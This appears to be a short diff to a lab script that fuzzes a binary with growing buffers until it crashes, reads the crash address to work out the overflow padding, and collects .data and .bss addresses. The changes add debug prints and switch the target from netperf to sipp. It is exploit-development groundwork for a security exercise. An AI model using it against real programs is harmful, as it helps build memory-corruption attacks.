@@ -69,6 +69,8 @@ def netperf(exe):
     while signal != 'SIGSEGV':
 
         slack += 254
+
+        print(slack);
         for x in range(1, 255):
             b.extend([x, x, x, x])
 
@@ -88,6 +90,7 @@ def netperf(exe):
 
         if response[-1]['payload']['reason'] == 'signal-received':
             address = response[-1]['payload']['frame']['addr']
+            print(address);
             if address[2:4] == address[4:6] or address[6:8] == address[8:]:
                 signal = response[-1]['payload']['signal-name']
                 # pprint(response)
@@ -112,7 +115,7 @@ def get_everything(exe):
 
 
 def test():
-    (padding, data, bss) = get_everything("netperf")  # original binary from the lab
+    (padding, data, bss) = get_everything("sipp-3.3/sipp")  # original binary from the lab
     print(padding)
     print(hex(data))
     print(hex(bss))
